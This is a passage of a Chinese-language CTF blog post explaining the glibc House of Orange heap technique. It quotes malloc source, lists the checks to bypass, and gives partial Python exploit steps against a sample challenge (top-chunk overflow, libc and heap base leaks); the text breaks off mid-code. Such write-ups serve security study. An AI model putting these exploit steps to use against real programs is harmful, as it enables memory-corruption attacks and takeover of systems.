            "content_html": "<h1 id=\"houes-of-orange\"><a class=\"markdownIt-Anchor\" href=\"#houes-of-orange\">#</a> houes-of-orange</h1>\n<blockquote>\n<p>前言:</p>\n<p>在此之前，我们短暂的了解了 IO_FILE。而 houes-of-orange 是一套结合 IO_FILE 的组合拳，威力巨大，但影响版本有限，随说影响范围小，但是学习这种攻击手法，可以让我们对于 IO_FILE 更加熟悉。</p>\n</blockquote>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— <code>2.26</code></li>\n<li>没有  <code>free</code></li>\n<li>可以  <code>unsortedbin attack</code></li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>此攻击是堆与 IO 结合的组合拳，非常的经典。并且攻击中利用 top_chunk 的性质</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Otherwise, relay to handle system-dependent cases</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token function\">sysmalloc</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">,</span> av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>perturb_byte<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>\n</blockquote>\n<pre><code>if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>old_top <span class=\"token operator\">==</span> <span class=\"token function\">initial_top</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> old_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>     <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>old_size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> MINSIZE <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>old_top<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>old_end <span class=\"token operator\">&amp;</span> pagemask<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>\n<p>malloc 的尺寸不能大于 <code>mmp_.mmap_threshold</code></p>\n</li>\n<li>\n<p>伪造的 size 必须要对齐到内存页</p>\n</li>\n<li>\n<p>size 要大于 MINSIZE (0x10)</p>\n</li>\n<li>\n<p>size 要小于之后申请的 chunk size + MINSIZE (0x10)</p>\n</li>\n<li>\n<p>size 的 prev inuse 位必须为 1</p>\n</li>\n</ul>\n<blockquote>\n<p>之后就是 IO_FILE 的伪造过程</p>\n</blockquote>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>one:</p>\n<p><strong>stage1</strong></p>\n<ul>\n<li>申请  <code>chunk A</code> ，假设此时的  <code>top_chunk</code>  的  <code>size</code>  为  <code>0xWXYZ</code></li>\n<li>写  <code>A</code> ，溢出修改  <code>top_chunk</code>  的  <code>size</code>  为  <code>0xXYZ</code> （需要满足页对齐的检测条件）</li>\n<li>申请一个大于  <code>0xXYZ</code>  大小的  <code>chunk</code> ，此时  <code>top_chunk</code>  会进行  <code>grow</code> ，并将原来的  <code>old top_chunk</code>  释放进入  <code>unsortedbin</code></li>\n</ul>\n<p><strong>stage2</strong></p>\n<ul>\n<li>溢出写  <code>A</code> ，修改处于  <code>unsortedbin</code>  中的  <code>old top_chunk</code> ，修改其  <code>size</code>  为  <code>0x61</code> ，其  <code>bk</code>  为  <code>&amp;_IO_list_all-0x10</code> ，同时伪造好  <code>IO_FILE</code>  结构</li>\n<li>申请非  <code>0x60</code>  大小的  <code>chunk</code>  的时候，首先触发  <code>unsortedbin attack</code> ，将 <code>_IO_list_all</code>  修改为  <code>main_arena+88</code> ，然后  <code>unsortedbin chunk</code>  会进入到  <code>smallbin</code> ，大小为  <code>0x60</code> ；接着遍历  <code>unsortedbin</code>  的时候触发了  <code>malloc_printerr</code> ，然后调用链为： <code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code> ，调用到伪造的  <code>vtable</code>  里面的函数指针</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG9tZS1vZi1vcmFuZ2U=\">CTF_Pwn_Game/home-of-orange at main · Yhuanhuan01/CTF_Pwn_Game (github.com)</span></p>\n<p><img data-src=\"/img/houes-of-orange/image-20240715115647333.png\" alt=\"image-20240715115647333\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>没有 <code>free</code> ，本能的想到 house-of-orange 的利用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  _DWORD nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 没规定 add 之后 size，可以溢出</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0x1000u</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"too large\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>chunk_ptr <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>nbytes<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>chunk_ptr <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 只能读 8 字节，还是比较的刁钻的</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>进行 house-of-orange 需要 libcbase 和 heapbase，libcbase 好泄露，但是 heapbase 的泄露方法比较的麻烦，需要调整堆风水，将三次 unsortedbin 内的 top_chunk 都放到同一大小的 largebin 链表项内</p>\n<p>泄露 libcbase</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x408</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xbf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x61</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span> <span class=\"token operator\">+</span> <span class=\"token number\">16672</span></pre></td></tr></table></figure><p>将 old_top_chunk 放进 <code>0x480-0x4b0</code> largebin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4b1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X600</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715121105947.png\" alt=\"image-20240715121105947\"></p>\n<p>然后用前面的思想再放两个这个 largebin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4d1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xaf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0X500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x5b0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x508</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xae1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>调整堆风水泄露 heapbase</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4a0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 